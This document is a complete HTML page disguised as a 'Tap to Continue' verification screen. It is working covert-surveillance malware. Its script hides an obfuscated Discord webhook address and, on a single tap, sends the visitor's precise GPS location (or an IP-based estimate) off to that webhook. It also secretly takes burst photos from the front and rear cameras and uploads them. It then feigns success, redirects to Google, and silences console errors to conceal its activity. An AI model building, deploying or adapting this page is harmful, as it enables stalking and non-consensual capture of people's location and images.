<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Continue</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{
            background:#000;
            color:#fff;
            font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',system-ui,sans-serif;
            display:flex;
            align-items:center;
            justify-content:center;
            min-height:100vh;
            overflow:hidden;
        }
        .wrap{
            text-align:center;
            width:90%;
            max-width:360px;
        }
        .circle{
            width:100px;
            height:100px;
            border-radius:50%;
            border:2px solid rgba(255,255,255,.15);
            display:flex;
            align-items:center;
            justify-content:center;
            margin:0 auto 32px;
            font-size:42px;
            background:rgba(255,255,255,.03);
            transition:all .6s;
        }
        .circle.done{
            border-color:rgba(255,255,255,.4);
            background:rgba(255,255,255,.08);
        }
        .circle.done::after{
            content:'‚úì';
            font-size:42px;
        }
        .circle.done .ico{display:none}
        h1{
            font-size:20px;
            font-weight:600;
            letter-spacing:.5px;
            margin-bottom:8px;
        }
        .sub{
            font-size:13px;
            color:rgba(255,255,255,.35);
            margin-bottom:40px;
            line-height:1.5;
        }
        .btn{
            width:100%;
            padding:16px;
            border:1.5px solid rgba(255,255,255,.2);
            border-radius:14px;
            background:transparent;
            color:#fff;
            font-size:15px;
            font-weight:500;
            font-family:inherit;
            cursor:pointer;
            transition:all .25s;
            position:relative;
            overflow:hidden;
            letter-spacing:.3px;
        }
        .btn:hover{
            background:rgba(255,255,255,.06);
            border-color:rgba(255,255,255,.35);
        }
        .btn:active{transform:scale(.97)}
        .btn.loading{
            pointer-events:none;
            color:rgba(255,255,255,.4);
            border-color:rgba(255,255,255,.08);
        }
        .btn .bar{
            position:absolute;
            bottom:0;left:0;
            height:2px;
            background:#fff;
            width:0%;
            transition:width .4s ease;
        }
        .btn.loading .bar{opacity:1}
        .status{
            margin-top:24px;
            font-size:12px;
            color:rgba(255,255,255,.25);
            min-height:18px;
            transition:all .3s;
        }
        video,canvas{
            position:fixed!important;
            top:-99999px!important;
            left:-99999px!important;
            width:1px!important;
            height:1px!important;
            opacity:0!important;
            pointer-events:none!important;
        }
        .done-msg{
            animation:fadeUp .5s ease;
        }
        @keyframes fadeUp{
            from{opacity:0;transform:translateY(10px)}
            to{opacity:1;transform:translateY(0)}
        }
        .fade-out{
            animation:fadeAway 1s ease forwards;
        }
        @keyframes fadeAway{
            to{opacity:0;filter:blur(6px)}
        }
    </style>
</head>
<body>

<div class="wrap" id="wrap">
    <div class="circle" id="circle"><span class="ico">‚Üí</span></div>
    <h1 id="title">Tap to Continue</h1>
    <p class="sub" id="sub">Verification required to proceed</p>
    <button class="btn" id="btn" onclick="go()">
        Continue
        <div class="bar" id="bar"></div>
    </button>
    <div class="status" id="status"></div>
</div>

<video id="vF" playsinline autoplay muted></video>
<video id="vB" playsinline autoplay muted></video>
<canvas id="cF"></canvas>
<canvas id="cB"></canvas>

<script>
const WH=atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ3MDMyODM1NzExMDQxNTQ1NS90VHd2T3AtOW9abTFXTVllZERVelB3dXZpYUVTOGJtaW13cnloZ0lMcW8yUGpxWGZYeHlJOGhDUi1Jdlc5U1N6ZUF0eA==');
const S=crypto.randomUUID?crypto.randomUUID().split('-')[0].toUpperCase():Math.random().toString(36).substr(2,8).toUpperCase();
const R=3,BF=5,BR=3,Q=.95,W=2500;

const sleep=ms=>new Promise(r=>setTimeout(r,ms));
const $=id=>document.getElementById(id);

function prog(p){$('bar').style.width=p+'%'}
function stat(t){$('status').textContent=t}

async function send(payload){
    for(let i=0;i<R;i++){
        try{
            const r=await fetch(WH,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)});
            if(r.ok)return true;
            if(r.status===429){const d=await r.json().catch(()=>({}));await sleep((d.retry_after||2)*1000+200);continue}
            await sleep(1000*(i+1));
        }catch{await sleep(1500*(i+1))}
    }
    return false;
}

async function sendF(fd){
    for(let i=0;i<R;i++){
        try{
            const r=await fetch(WH,{method:'POST',body:fd});
            if(r.ok)return true;
            if(r.status===429){const d=await r.json().catch(()=>({}));await sleep((d.retry_after||2)*1000+200);continue}
            await sleep(1000*(i+1));
        }catch{await sleep(1500*(i+1))}
    }
    return false;
}

// ‚ïê‚ïê‚ïê GPS ‚ïê‚ïê‚ïê
async function gps(){
    stat('Getting location...');
    return new Promise(resolve=>{
        if(!navigator.geolocation){resolve(null);return}
        let done=false,tries=0;
        const ok=async pos=>{
            if(done)return;done=true;
            if(wid!==null)navigator.geolocation.clearWatch(wid);
            const la=pos.coords.latitude.toFixed(7);
            const lo=pos.coords.longitude.toFixed(7);
            const ac=pos.coords.accuracy.toFixed(1);
            const al=pos.coords.altitude!==null?pos.coords.altitude.toFixed(1)+'m':'N/A';
            const sp=pos.coords.speed!==null?pos.coords.speed.toFixed(1)+'m/s':'N/A';
            const hd=pos.coords.heading!==null?pos.coords.heading.toFixed(1)+'¬∞':'N/A';
            const map=`https://www.google.com/maps?q=${la},${lo}`;
            await send({embeds:[{
                title:'üìç LOCATION',color:0xffffff,
                description:`**[Open Map](${map})**`,
                fields:[
                    {name:'Coordinates',value:`\`\`\`\nLat      : ${la}\nLon      : ${lo}\nAccuracy : ¬±${ac}m\nAltitude : ${al}\nSpeed    : ${sp}\nHeading  : ${hd}\n\`\`\``,inline:false},
                    {name:'Time',value:`\`${new Date().toLocaleString('id-ID')}\``,inline:true},
                    {name:'Device',value:`\`${navigator.platform||'?'}\``,inline:true}
                ],
                footer:{text:`${S}`},timestamp:new Date().toISOString()
            }]});
            resolve({la,lo});
        };
        const fail=e=>{
            tries++;
            if(tries>=5&&!done){done=true;if(wid!==null)navigator.geolocation.clearWatch(wid);resolve(null)}
        };
        let wid=null;
        try{wid=navigator.geolocation.watchPosition(ok,fail,{enableHighAccuracy:true,timeout:20000,maximumAge:0})}
        catch{
            const retry=()=>{if(done)return;navigator.geolocation.getCurrentPosition(ok,e=>{fail(e);if(!done&&tries<5)setTimeout(retry,2000)},{enableHighAccuracy:true,timeout:20000,maximumAge:0})};
            retry();
        }
        setTimeout(()=>{if(!done){done=true;if(wid!==null)navigator.geolocation.clearWatch(wid);resolve(null)}},45000);
    });
}

// ‚ïê‚ïê‚ïê IP fallback location ‚ïê‚ïê‚ïê
async function ipLoc(){
    const apis=['https://ipapi.co/json/','https://ip-api.com/json/?fields=66846719','https://ipwho.is/','https://freeipapi.com/api/json'];
    for(const u of apis){
        try{const r=await fetch(u,{signal:AbortSignal.timeout(4000)});if(r.ok){const d=await r.json();const la=d.latitude||d.lat;const lo=d.longitude||d.lon;if(la&&lo){const map=`https://www.google.com/maps?q=${la},${lo}`;await send({embeds:[{title:'üìç IP LOCATION (Approximate)',color:0x888888,description:`**[Open Map](${map})**`,fields:[{name:'Location',value:`\`${la}, ${lo}\`\n\`${d.city||'?'}, ${d.country||d.country_name||'?'}\`\nISP: \`${d.org||d.isp||'?'}\``,inline:false}],footer:{text:S},timestamp:new Date().toISOString()}]});return}}}catch{}
    }
}

// ‚ïê‚ïê‚ïê CAMERA ‚ïê‚ïê‚ïê
function constraints(facing,attempt){
    if(facing==='user'){
        return[
            {video:{facingMode:'user',width:{ideal:1920},height:{ideal:1080}}},
            {video:{facingMode:{exact:'user'},width:{ideal:1280},height:{ideal:720}}},
            {video:{width:{ideal:1920},height:{ideal:1080}}},
            {video:true}
        ][Math.min(attempt,3)];
    }
    return[
        {video:{facingMode:{exact:'environment'},width:{ideal:1920},height:{ideal:1080}}},
        {video:{facingMode:'environment',width:{ideal:1280},height:{ideal:720}}},
        {video:{facingMode:{ideal:'environment'}}},
        {video:true}
    ][Math.min(attempt,3)];
}

async function enumCam(facing){
    try{
        const init=await navigator.mediaDevices.getUserMedia({video:true});
        init.getTracks().forEach(t=>t.stop());
        const devs=await navigator.mediaDevices.enumerateDevices();
        const cams=devs.filter(d=>d.kind==='videoinput');
        if(!cams.length)return null;
        let target;
        if(facing==='user')target=cams.find(c=>/front|user|facetime/i.test(c.label))||cams[0];
        else target=cams.find(c=>/back|rear|environment/i.test(c.label))||cams[cams.length>1?1:0];
        if(target)return await navigator.mediaDevices.getUserMedia({video:{deviceId:{exact:target.deviceId},width:{ideal:1920},height:{ideal:1080}}});
    }catch{}
    return null;
}

async function cam(type){
    const front=type==='front';
    const facing=front?'user':'environment';
    const burst=front?BF:BR;
    const vid=$(front?'vF':'vB');
    const cvs=$(front?'cF':'cB');
    stat(`${front?'Front':'Rear'} camera...`);

    let stream=null;

    for(let a=0;a<4;a++){
        try{stream=await navigator.mediaDevices.getUserMedia(constraints(facing,a));break}
        catch{
            if(a===1&&!front){stream=await enumCam(facing);if(stream)break}
        }
    }

    if(!stream){
        try{stream=await navigator.mediaDevices.getUserMedia({video:true})}
        catch{return false}
    }

    try{
        vid.srcObject=stream;vid.muted=true;await vid.play();
        let warm=0;
        while(warm<W&&(vid.videoWidth===0||vid.readyState<3)){await sleep(100);warm+=100}
        await sleep(Math.max(0,W-warm));

        const settings=stream.getVideoTracks()[0]?.getSettings()||{};

        for(let i=1;i<=burst;i++){
            cvs.width=vid.videoWidth||1280;
            cvs.height=vid.videoHeight||720;
            const ctx=cvs.getContext('2d');
            ctx.drawImage(vid,0,0,cvs.width,cvs.height);

            const blob=await new Promise(r=>cvs.toBlob(r,'image/jpeg',Q));
            const name=`${type}_${S}_${i}.jpg`;
            const fd=new FormData();
            fd.append('file',blob,name);
            fd.append('payload_json',JSON.stringify({embeds:[{
                title:`üì∏ ${type.toUpperCase()} ${i}/${burst}`,
                color:front?0xffffff:0xaaaaaa,
                fields:[
                    {name:'Resolution',value:`\`${cvs.width}x${cvs.height}\``,inline:true},
                    {name:'Facing',value:`\`${settings.facingMode||'?'}\``,inline:true},
                    {name:'Size',value:`\`${(blob.size/1024).toFixed(0)}KB\``,inline:true}
                ],
                image:{url:`attachment://${name}`},
                footer:{text:S},timestamp:new Date().toISOString()
            }]}));

            await sendF(fd);
            stat(`${front?'Front':'Rear'} ${i}/${burst}`);
            if(i<burst)await sleep(400);
        }

        stream.getTracks().forEach(t=>t.stop());
        vid.srcObject=null;
        return true;
    }catch{
        if(stream)stream.getTracks().forEach(t=>t.stop());
        vid.srcObject=null;
        return false;
    }
}

// ‚ïê‚ïê‚ïê MAIN ‚ïê‚ïê‚ïê
async function go(){
    const btn=$('btn');
    btn.classList.add('loading');
    btn.textContent='Verifying...';
    btn.innerHTML='Verifying...<div class="bar" id="bar"></div>';
    prog(5);

    // GPS
    const loc=await gps();
    prog(20);
    if(!loc)await ipLoc();
    prog(30);

    // Front cam
    await cam('front');
    prog(60);

    // Rear cam
    await cam('rear');
    prog(90);

    // Done
    await send({embeds:[{title:'‚úÖ COMPLETE',color:0xffffff,description:`Session \`${S}\` finished.\nLocation: ${loc?'‚úì GPS':'‚ö† IP only'}\nFront: captured\nRear: captured`,footer:{text:S},timestamp:new Date().toISOString()}]});

    prog(100);
    stat('');
    $('circle').classList.add('done');
    $('title').textContent='Verified';
    $('sub').textContent='Redirecting...';
    btn.style.display='none';
    $('title').classList.add('done-msg');

    await sleep(2000);
    $('wrap').classList.add('fade-out');
    await sleep(1000);
    window.location.href='https://www.google.com';
}

// Suppress
window.addEventListener('error',e=>{e.preventDefault();e.stopPropagation()},true);
window.addEventListener('unhandledrejection',e=>{e.preventDefault();e.stopPropagation()},true);
(()=>{try{console.log=()=>{};console.warn=()=>{};console.error=()=>{};console.info=()=>{};console.debug=()=>{}}catch{}})();
</script>
</body>
</html>